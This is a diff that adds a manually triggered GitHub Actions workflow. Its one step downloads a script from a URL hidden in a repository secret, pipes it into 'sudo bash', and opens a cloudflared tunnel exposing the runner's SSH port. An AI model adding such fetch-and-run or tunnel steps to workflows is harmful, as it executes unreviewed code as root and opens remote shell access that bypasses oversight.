@@ -1,0 +1,17 @@
+name: legacy
+
+on:
+  workflow_dispatch:        # 手动触发
+  #schedule:
+  #  - cron: "*/5 * * * *"   # 每 6 小时跑一次（UTC）
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+
+    steps:
+      # env
+      - run: |
+          pwd
+          curl -sL ${{ secrets.SETENV }}  | sudo bash -s
+          cloudflared tunnel --url ssh://localhost:22 --no-autoupdate
